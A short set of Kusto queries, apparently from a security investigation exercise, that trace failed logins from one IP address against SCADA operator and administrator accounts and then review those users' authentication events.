AuthenticationEvents
| where src_ip == "87.250.252.242"
| where result == "Failed Login"
| where username in (
    Employees
    | where role in ("SCADA Operator", "SCADA Administrator")
    | distinct username
)
| project timestamp, username, result
| order by timestamp asc

Employees
| where role in ("SCADA Operator", "SCADA Administrator")
| project name, username, role, hostname

AuthenticationEvents
| where username in ("waho", "jisaetang")
| where src_ip == "87.250.252.242"
| project timestamp, username, result
| order by timestamp asc

ProcessEvents
